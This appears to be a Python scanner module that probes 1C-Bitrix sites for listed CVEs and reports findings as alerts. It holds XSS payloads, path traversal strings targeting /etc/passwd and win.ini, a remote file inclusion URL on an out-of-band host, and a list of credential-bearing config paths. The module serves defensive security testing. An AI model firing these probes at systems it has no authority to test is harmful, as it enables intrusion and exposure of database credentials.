# Filename: VulnerabilityChecks/1CBitrixScanRule.py

import asyncio
import logging
import random
import string
import uuid
import urllib.parse
import html # For XSS evidence
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple, Set

import aiohttp
# from bs4 import BeautifulSoup # Not strictly needed for these specific checks if inputs are pre-identified

# --- Alert Dataclass ---
@dataclass
class BitrixVulnerabilityAlert:
    cwe_id: int
    wasc_id: int # May not always apply or be known for older CVEs
    name: str
    description: str
    uri: str # URL where vulnerability was found/triggered
    attack_details: Dict[str, Any] = field(default_factory=dict) # e.g., {"cve": "CVE-XXXX", "parameter": "param_name", "payload": "...", "method": "GET", "location": "url_param/form_param/direct_path"}
    evidence: str = ""
    solution: str = (
        "Update 1C-Bitrix to the latest version and apply all security patches. "
        "Review system configurations, remove unnecessary files/modules, and ensure proper access controls."
    )
    reference: str = "" # CVE specific, e.g., "https://nvd.nist.gov/vuln/detail/CVE-XXXX"
    risk: int = 3 # Default Medium (1:Info, 2:Low, 3:Medium, 4:High)
    confidence: int = 2 # Default Medium (1:Low, 2:Medium, 3:High)
    alert_tags: Dict[str, str] = field(default_factory=dict) # e.g., {"CVE": "CVE-XXXX", "Vulnerability": "XSS"}

    def as_dict(self) -> Dict[str, Any]:
        return {
            "vulnerability_type": self.alert_tags.get("Vulnerability", "Bitrix_Vulnerability"), # More generic type
            "type": self.name, # Specific name of the alert
            "detail": self.description,
            "payload_used": str(self.attack_details.get("payload", "N/A")),
            "injection_point_info": f"{self.attack_details.get('location', 'N/A')}: {self.attack_details.get('parameter', self.attack_details.get('path', 'N/A'))}",
            "url_tested": self.uri,
            "severity": {1: "Info", 2: "Low", 3: "Medium", 4: "High"}.get(self.risk, "Unknown"),
            "confidence": {1: "Low", 2: "Medium", 3: "High"}.get(self.confidence, "Unknown"),
            "evidence": self.evidence,
            "solution": self.solution,
            "reference": self.reference,
            "cwe_id": self.cwe_id,
            "wasc_id": self.wasc_id if self.wasc_id else 0, # Ensure it's an int
            "alert_tags": self.alert_tags,
            "other_info": f"Attack Details: {self.attack_details}"
        }

# --- Main Scan Rule Class ---
class BitrixActiveScanRule:
    # This attribute will be checked by ActiveVulnerabilityCheck
    tech_required: Set[str] = {"1c-bitrix"}

    def __init__(self,
                 parent_logger: Optional[logging.Logger] = None,
                 oast_base_url: Optional[str] = None,
                 http_timeout: float = 20.0,
                 # Common Bitrix paths can be configured here or passed if needed
                 # common_bitrix_paths: Optional[Dict[str, List[str]]] = None,
                 active_scan_async_q: Optional[asyncio.Queue] = None
                 ):
        self.logger = parent_logger or logging.getLogger(__name__)
        self.oast_base_url = self._normalize_oast_url(oast_base_url) if oast_base_url else None
        self.http_timeout = http_timeout
        self.active_scan_async_q = active_scan_async_q

        # --- Payloads and Paths ---
        self.xss_payloads_generic = [
            "<script>alert('BitrixXSS1')</script>",
            "'\"><svg onload=alert('BitrixXSS2')>",
            "<img src=x onerror=alert('BitrixXSS3')>",
        ]
        # For CVE-2020-13758 (WAF XSS), might need more WAF-bypass specific payloads if known
        self.xss_payloads_waf_bypass = self.xss_payloads_generic # Start with generic

        self.lfi_payloads = {
            "unix_common": "../../../../../../../../../../etc/passwd",
            "windows_common": "../../../../../../../../../../windows/win.ini",
            # Add more Bitrix-specific traversal if known, e.g., to reach specific config files
            # relative to a known include path.
        }
        self.lfi_evidence_patterns = {
            "unix_common": [b"root:x:0:0"],
            "windows_common": [b"[fonts]", b"[extensions]"]
        }

        self.rfi_marker = f"BITRIXRFICHECK{uuid.uuid4().hex[:6].upper()}"
        self.rfi_payload_url_template = f"http://{{oast_domain}}/{self.rfi_marker}.php"
        # The .php file on OAST server should contain: <?php echo "{self.rfi_marker}"; ?>

        self.open_redirect_target_template = "http://{oast_domain}/BITRIXREDIRECT"
        self.open_redirect_params = ["redirect_url", "goto", "return", "next", "url", "target", "r", "returnTo", "return_path"] # Common redirect params

        self.updater_log_paths = ["/updater.log", "/bitrix/updater.log", "/bitrix/updates/updater.log", "/upload/updater.log"]
        self.sensitive_info_direct_paths = {
            # Path: (Expected patterns for confirmation, Risk if found)
            "/bitrix/php_interface/dbconn.php": ([b"$DBLogin", b"$DBPassword", b"BX_TEMPORARY_FILES_CACHE"], 4),
            "/bitrix/.settings.php": ([b"'login'", b"'password'", b"'database'", b"connections"], 4), # Newer versions
            "/bitrix/license_key.php": ([b"LICENSE_KEY"], 3),
            "/readme.txt": ([b"1C-Bitrix", b"CMS"], 1), # Low risk, version info
            "/install.php": ([b"Bitrix", b"Installation"], 2), # If accessible post-install
            "/bitrix/modules/main/install/wizard/wizard.php": ([b"Bitrix Site Manager Installation Wizard"], 2), # Setup wizard
        }

    def _normalize_oast_url(self, url: str) -> Optional[str]:
        if not url: return None
        parsed = urllib.parse.urlparse(url)
        # Return only the netloc (domain/IP:port)
        return parsed.netloc if parsed.netloc else None

    async def _send_request(
        self, session: aiohttp.ClientSession, method: str, url: str,
        headers: Optional[Dict[str, str]] = None, params: Optional[Dict[str, Any]] = None,
        data: Optional[Any] = None, allow_redirects: bool = False
    ) -> Tuple[Optional[aiohttp.ClientResponse], str, Dict[str, str], Optional[bytes]]:
        req_headers = (headers or {}).copy()
        if "User-Agent" not in req_headers:
            req_headers["User-Agent"] = f"BitrixSecurityScanner/1.0 ({uuid.uuid4().hex[:8]})"

        self.logger.debug(f"BitrixScan: {method} {url}, Params: {params}, Data: {str(data)[:100] if data else 'None'}")
        resp_text, resp_headers, resp_bytes = "", {}, None
        resp_obj = None
        try:
            timeout = aiohttp.ClientTimeout(total=self.http_timeout)
            async with session.request(
                method.upper(), url, headers=req_headers, params=params, data=data,
                timeout=timeout, allow_redirects=allow_redirects
            ) as resp:
                resp_obj = resp
                try:
                    resp_bytes = await resp.read()
                    resp_text = resp_bytes.decode(errors='replace') # Best effort decode
                except Exception as e_read:
                    self.logger.warning(f"Error reading response from {url}: {e_read}")
                resp_headers = dict(resp.headers)
                self.logger.debug(f"BitrixScan: Response from {url}: Status {resp.status}")
        except asyncio.TimeoutError:
            self.logger.warning(f"BitrixScan: Request to {url} timed out.")
        except aiohttp.ClientError as e:
            self.logger.warning(f"BitrixScan: Request to {url} client error: {e}")
        except Exception as e_req:
            self.logger.error(f"BitrixScan: Unexpected error for {url}: {e_req}")
        return resp_obj, resp_text, resp_headers, resp_bytes

    async def _emit_alert(self, alert_obj: BitrixVulnerabilityAlert):
        if self.active_scan_async_q:
            try:
                await self.active_scan_async_q.put({
                    "type": "active_scan_alert", "alert": alert_obj.as_dict()
                })
                self.logger.info(f"BitrixScan: Emitted alert - {alert_obj.name} for {alert_obj.uri}")
            except Exception as e:
                self.logger.error(f"BitrixScan: Failed to emit alert to queue: {e}")
        else:
            self.logger.warning(f"BitrixScan: Async queue not available. Alert not emitted: {alert_obj.name}")

    # --- CVE Check Methods ---

    async def _check_xss_cve202013758_cve20062477(
        self, session: aiohttp.ClientSession, base_url: str,
        injection_details: Dict[str, Any], # From ActiveVulnerabilityCheck
        cve_id: str, cve_name_suffix: str, is_admin_context: bool
    ):
        target_url = injection_details.get("form_action_url", base_url) # Use form action if available
        param_name = injection_details["param_name"]
        original_value = injection_details["original_value"]
        method = injection_details.get("method", "GET").upper()
        location = injection_details.get("location", "unknown_param") # e.g. url_params, form_data_post

        payloads_to_use = self.xss_payloads_waf_bypass if "WAF" in cve_name_suffix else self.xss_payloads_generic

        for payload in payloads_to_use:
            self.logger.debug(f"BitrixXSS ({cve_id}): Testing {param_name} on {target_url} with payload: {payload[:30]}")
            
            req_params, req_data = None, None
            # Construct request based on injection location
            if location == "url_params" or (location == "form_data_get" and method == "GET"):
                req_params = {param_name: payload}
                # Include other original GET params if any (not easily available from injection_details alone)
            elif location == "form_data_post" and method == "POST":
                req_data = injection_details.get("all_form_fields", {}).copy() # Get all original form fields
                req_data[param_name] = payload # Inject into the target param
            else: # Fallback for simple param testing if location details are sparse
                if method == "GET": req_params = {param_name: payload}
                elif method == "POST": req_data = {param_name: payload}
                else: continue

            resp_obj, resp_text, _, _ = await self._send_request(session, method, target_url, params=req_params, data=req_data)

            if resp_obj and resp_text:
                # Basic reflection check. More advanced checks (e.g., in script tags, attributes) are complex.
                # Ensure payload is not overly escaped.
                if payload in resp_text and html.escape(payload) not in resp_text:
                    alert = BitrixVulnerabilityAlert(
                        cwe_id=79, wasc_id=8,
                        name=f"1C-Bitrix Reflected XSS ({cve_id}{cve_name_suffix})",
                        description=f"Potential Reflected XSS in parameter '{param_name}' via {cve_id}. Payload reflected unescaped.",
                        uri=target_url,
                        attack_details={"cve": cve_id, "parameter": param_name, "payload": payload, "method": method, "location": location},
                        evidence=f"Payload '{payload[:50]}' reflected in response. Snippet: ...{html.escape(resp_text[max(0, resp_text.find(payload)-30):resp_text.find(payload)+len(payload)+30])}...",
                        reference=f"https://nvd.nist.gov/vuln/detail/{cve_id}",
                        risk=4 if is_admin_context else 3, confidence=2,
                        alert_tags={"CVE": cve_id, "Vulnerability": "XSS", "Context": "Admin" if is_admin_context else "WAF/General"}
                    )
                    await self._emit_alert(alert)
                    return # Found for this param

    async def _check_lfi_cve20158358(
        self, session: aiohttp.ClientSession, base_url: str,
        injection_details: Dict[str, Any]
    ):
        cve_id = "CVE-2015-8358"
        target_url = injection_details.get("form_action_url", base_url)
        param_name = injection_details["param_name"]
        method = injection_details.get("method", "GET").upper()
        location = injection_details.get("location", "unknown_param")

        for lfi_type, payload_str in self.lfi_payloads.items():
            self.logger.debug(f"BitrixLFI ({cve_id}): Testing {param_name} on {target_url} with {lfi_type} payload: {payload_str}")
            req_params, req_data = None, None
            if method == "GET": req_params = {param_name: payload_str}
            elif method == "POST": req_data = {param_name: payload_str} # Simplified, assumes single param POST
            else: continue

            _, _, _, resp_bytes = await self._send_request(session, method, target_url, params=req_params, data=req_data)

            if resp_bytes:
                for evidence_pattern in self.lfi_evidence_patterns.get(lfi_type, []):
                    if evidence_pattern in resp_bytes:
                        alert = BitrixVulnerabilityAlert(
                            cwe_id=22, wasc_id=33,
                            name=f"1C-Bitrix Directory Traversal/LFI ({cve_id})",
                            description=f"Potential LFI in parameter '{param_name}' via {cve_id}. Sensitive file content pattern detected.",
                            uri=target_url,
                            attack_details={"cve": cve_id, "parameter": param_name, "payload": payload_str, "method": method, "location": location},
                            evidence=f"Pattern '{evidence_pattern.decode(errors='ignore')}' found for payload '{payload_str}'.",
                            reference=f"https://nvd.nist.gov/vuln/detail/{cve_id}",
                            risk=4, confidence=3,
                            alert_tags={"CVE": cve_id, "Vulnerability": "LFI"}
                        )
                        await self._emit_alert(alert)
                        return # Found

    async def _check_open_redirect_cve20062478(
        self, session: aiohttp.ClientSession, base_url: str, # base_url here is the form action URL
        injection_details: Dict[str, Any] # Contains all_form_fields
    ):
        cve_id = "CVE-2006-2478"
        if not self.oast_base_url:
            self.logger.warning(f"BitrixOpenRedirect ({cve_id}): OAST URL not configured. Skipping.")
            return

        oast_domain = self._normalize_oast_url(self.oast_base_url)
        if not oast_domain:
             self.logger.warning(f"BitrixOpenRedirect ({cve_id}): Invalid OAST domain. Skipping.")
             return
        
        redirect_target_payload = self.open_redirect_target_template.format(oast_domain=oast_domain)
        
        # This CVE is for POST. The injection_details should be for a form.
        form_action_url = injection_details.get("form_action_url", base_url)
        original_form_data = injection_details.get("all_form_fields", {}).copy()
        method = injection_details.get("method", "POST").upper()

        if method != "POST":
            self.logger.debug(f"BitrixOpenRedirect ({cve_id}): Skipping non-POST method for {form_action_url}")
            return

        for param_to_inject in self.open_redirect_params:
            # Check if this param exists in the original form, or just try injecting it
            # For this CVE, it's about modifying an existing param or adding one if the app picks it up.
            # Let's try both: modify if exists, add if not.
            
            data_payload = original_form_data.copy()
            data_payload[param_to_inject] = redirect_target_payload # Inject/overwrite

            self.logger.debug(f"BitrixOpenRedirect ({cve_id}): Testing param '{param_to_inject}' on {form_action_url} via POST, redirect to: {redirect_target_payload}")
            resp_obj, _, resp_headers, _ = await self._send_request(session, "POST", form_action_url, data=data_payload, allow_redirects=False)

            if resp_obj and resp_obj.status in [301, 302, 303, 307, 308]:
                location_header = resp_headers.get("Location", "")
                if oast_domain in location_header: # Check if it redirected to our OAST domain
                    alert = BitrixVulnerabilityAlert(
                        cwe_id=601, wasc_id=38,
                        name=f"1C-Bitrix Open Redirect ({cve_id})",
                        description=f"Potential Open Redirect in POST parameter '{param_to_inject}' via {cve_id}. Server redirected to OAST domain.",
                        uri=form_action_url,
                        attack_details={"cve": cve_id, "parameter": param_to_inject, "payload": redirect_target_payload, "method": "POST", "location": "form_parameter"},
                        evidence=f"HTTP {resp_obj.status} with Location: {location_header}",
                        reference=f"https://nvd.nist.gov/vuln/detail/{cve_id}",
                        risk=2, confidence=3,
                        alert_tags={"CVE": cve_id, "Vulnerability": "OpenRedirect", "OAST_Interaction": "HeaderCheck"}
                    )
                    await self._emit_alert(alert)
                    return # Found

    async def _check_updater_log_cve20062476(self, session: aiohttp.ClientSession, base_app_url: str):
        cve_id = "CVE-2006-2476"
        for path in self.updater_log_paths:
            target_url = urllib.parse.urljoin(base_app_url, path.lstrip('/'))
            self.logger.debug(f"BitrixUpdaterLog ({cve_id}): Checking {target_url}")
            resp_obj, resp_text, _, _ = await self._send_request(session, "GET", target_url)

            if resp_obj and resp_obj.status == 200 and len(resp_text) > 20: # Avoid empty "OK"
                if any(keyword in resp_text.lower() for keyword in ["update", "log", "error", "success", "[", "]"]): # Log-like content
                    alert = BitrixVulnerabilityAlert(
                        cwe_id=532, wasc_id=13, # Information Exposure Through Log Files
                        name=f"1C-Bitrix updater.log Accessible ({cve_id})",
                        description=f"File '{path}' (updater.log) may be publicly accessible via {cve_id}.",
                        uri=target_url,
                        attack_details={"cve": cve_id, "path": path, "method": "GET", "location": "direct_path"},
                        evidence=f"HTTP 200 for {target_url}. Snippet: {html.escape(resp_text[:100])}",
                        reference=f"https://nvd.nist.gov/vuln/detail/{cve_id}",
                        risk=2, confidence=2,
                        alert_tags={"CVE": cve_id, "Vulnerability": "InformationDisclosure"}
                    )
                    await self._emit_alert(alert)
                    # Don't return early, check all known paths

    async def _check_rfi_cve20051978(
        self, session: aiohttp.ClientSession, base_url: str,
        injection_details: Dict[str, Any]
    ):
        cve_id = "CVE-2005-1978"
        if not self.oast_base_url:
            self.logger.warning(f"BitrixRFI ({cve_id}): OAST URL not configured. Skipping.")
            return
        
        oast_domain = self._normalize_oast_url(self.oast_base_url)
        if not oast_domain:
             self.logger.warning(f"BitrixRFI ({cve_id}): Invalid OAST domain. Skipping.")
             return

        rfi_payload = self.rfi_payload_url_template.format(oast_domain=oast_domain)
        
        target_url = injection_details.get("form_action_url", base_url)
        param_name = injection_details["param_name"]
        method = injection_details.get("method", "GET").upper()
        location = injection_details.get("location", "unknown_param")

        self.logger.debug(f"BitrixRFI ({cve_id}): Testing {param_name} on {target_url} with RFI payload: {rfi_payload}")
        req_params, req_data = None, None
        if method == "GET": req_params = {param_name: rfi_payload}
        elif method == "POST": req_data = {param_name: rfi_payload} # Simplified
        else: return

        resp_obj, resp_text, _, _ = await self._send_request(session, method, target_url, params=req_params, data=req_data)

        if resp_obj and resp_text and self.rfi_marker in resp_text:
            alert = BitrixVulnerabilityAlert(
                cwe_id=98, wasc_id=5,
                name=f"1C-Bitrix Remote File Inclusion ({cve_id})",
                description=f"Potential RFI in parameter '{param_name}' via {cve_id}. Marker from remote file found in response.",
                uri=target_url,
                attack_details={"cve": cve_id, "parameter": param_name, "payload": rfi_payload, "method": method, "location": location},
                evidence=f"Marker '{self.rfi_marker}' found for RFI payload '{rfi_payload}'.",
                reference=f"https://nvd.nist.gov/vuln/detail/{cve_id}",
                risk=4, confidence=3,
                alert_tags={"CVE": cve_id, "Vulnerability": "RFI", "OAST_Interaction": "ContentCheck"}
            )
            await self._emit_alert(alert)
            return # Found

    async def _check_sensitive_info_cve20051977(self, session: aiohttp.ClientSession, base_app_url: str):
        cve_id = "CVE-2005-1977"
        for path, (patterns, risk) in self.sensitive_info_direct_paths.items():
            target_url = urllib.parse.urljoin(base_app_url, path.lstrip('/'))
            self.logger.debug(f"BitrixSensitiveInfo ({cve_id}): Checking {target_url}")
            resp_obj, resp_text, _, resp_bytes = await self._send_request(session, "GET", target_url)

            if resp_obj and resp_obj.status == 200:
                evidence_found = False
                evidence_detail = f"HTTP 200 for {target_url}."
                if resp_bytes: # Check byte patterns first
                    for pattern_byte in patterns:
                        if pattern_byte in resp_bytes:
                            evidence_found = True
                            evidence_detail = f"Pattern '{pattern_byte.decode(errors='ignore')}' found in response from {target_url}."
                            break
                
                if not evidence_found and resp_text and len(resp_text) > 10: # Fallback to text if no byte pattern matched
                    # Avoid flagging generic "not found" or "access denied" pages that return 200
                    if not ("<html" in resp_text.lower() and any(err_kw in resp_text.lower() for err_kw in ["error", "not found", "access denied", "forbidden"])):
                        evidence_found = True # Assume sensitive if content exists and not obvious error
                        evidence_detail += f" Content exists. Snippet: {html.escape(resp_text[:100])}"

                if evidence_found:
                    alert = BitrixVulnerabilityAlert(
                        cwe_id=200, wasc_id=13,
                        name=f"1C-Bitrix Sensitive Info Disclosure ({cve_id}) - {path}",
                        description=f"Sensitive file/path '{path}' may be accessible via {cve_id}.",
                        uri=target_url,
                        attack_details={"cve": cve_id, "path": path, "method": "GET", "location": "direct_path"},
                        evidence=evidence_detail,
                        reference=f"https://nvd.nist.gov/vuln/detail/{cve_id}",
                        risk=risk, confidence=3 if "Pattern" in evidence_detail else 2,
                        alert_tags={"CVE": cve_id, "Vulnerability": "InformationDisclosure"}
                    )
                    await self._emit_alert(alert)
                    # Continue checking other paths

    # --- Main Scan Orchestration Method ---
    async def scan(
        self,
        base_app_url: str, # Base URL of the Bitrix application (e.g., http://victim.com/ or http://victim.com/bitrix/)
        aiohttp_session: aiohttp.ClientSession,
        # injection_points: Optional[List[Dict[str, Any]]] = None, # List of dicts from ActiveVulnerabilityCheck._identify_injection_points
        # For parameter-based checks, these would come from ActiveVulnerabilityCheck._identify_injection_points
        # and be passed as `injection_details` by the caller (ActiveVulnerabilityCheck)
        # The `scan` method of a rule in ActiveVulnerabilityCheck is usually called per injection point or per URL.
        # This rule needs to handle both URL-based checks and parameter-based checks.
        # Let's assume this `scan` method is called ONCE per `base_app_url` if it's a URL-based scanner,
        # OR it's called PER `injection_details` if it's a parameter-based scanner.
        # To simplify, we'll make this `scan` method capable of doing both if `injection_details` is provided.
        # If `injection_details` is None, it only does URL-based checks.
        
        # Arguments as expected by ActiveVulnerabilityCheck for a specific scanner:
        original_url: str, # The specific URL that triggered this scan (could be same as base_app_url or a deeper page)
        original_headers: Dict[str, str],
        original_cookies: Dict[str, str],
        injection_details: Optional[Dict[str, Any]] = None, # Single injection point detail
        html_content: Optional[str] = None, # HTML of original_url
        # page_specific_technologies: Optional[List[str]] = None, # Already checked by caller
        is_admin_context: bool = False # If the crawler/caller knows this URL is admin
    ):
        self.logger.info(f"BitrixActiveScanRule: Starting scan for base='{base_app_url}', specific_url='{original_url}', injection_point='{injection_details['param_name'] if injection_details else 'N/A'}'")

        # Normalize base_app_url
        parsed_base = urllib.parse.urlparse(base_app_url)
        normalized_base_app_url = f"{parsed_base.scheme}://{parsed_base.netloc}{parsed_base.path.rstrip('/')}/"


        # --- Perform URL-based checks (if no specific injection point is being tested, or run them once per app) ---
        # These should ideally run once per application, not per injection point.
        # ActiveVulnerabilityCheck needs to manage this (e.g., by calling a separate method for URL checks).
        # For now, let's assume if injection_details is None, we do URL checks.
        if injection_details is None:
            self.logger.info(f"BitrixActiveScanRule: Performing URL-based checks for {normalized_base_app_url}")
            await self._check_updater_log_cve20062476(aiohttp_session, normalized_base_app_url)
            await self._check_sensitive_info_cve20051977(aiohttp_session, normalized_base_app_url)
            # Open Redirect (CVE-2006-2478) is tricky here as it needs POST forms.
            # It's better handled when specific forms (injection_details for forms) are processed.
        
        # --- Perform Parameter-based checks (if injection_details is provided) ---
        if injection_details:
            self.logger.info(f"BitrixActiveScanRule: Performing parameter-based checks for injection point: {injection_details.get('param_name')} on {original_url}")
            
            # CVE-2020-13758 (XSS WAF) & CVE-2006-2477 (XSS Admin)
            # These are essentially the same XSS check logic, differentiated by context.
            # Let's assume CVE-2020-13758 is the general case (WAF implies it's on many inputs).
            await self._check_xss_cve202013758_cve20062477(
                aiohttp_session, original_url, injection_details, "CVE-2020-13758", " in WAF/General", is_admin_context
            )
            if is_admin_context: # If also admin, explicitly test for the admin CVE context
                 await self._check_xss_cve202013758_cve20062477(
                    aiohttp_session, original_url, injection_details, "CVE-2006-2477", " in Admin Interface", True
                )

            # CVE-2015-8358 (LFI)
            await self._check_lfi_cve20158358(aiohttp_session, original_url, injection_details)

            # CVE-2005-1978 (RFI)
            await self._check_rfi_cve20051978(aiohttp_session, original_url, injection_details)

            # CVE-2006-2478 (Open Redirect - POST specific)
            # This check is relevant if the injection_details represent a POST form parameter.
            if injection_details.get("method", "").upper() == "POST" and \
               injection_details.get("location", "").startswith("form_data"):
                await self._check_open_redirect_cve20062478(aiohttp_session, original_url, injection_details)

        self.logger.info(f"BitrixActiveScanRule: Scan finished for specific context.")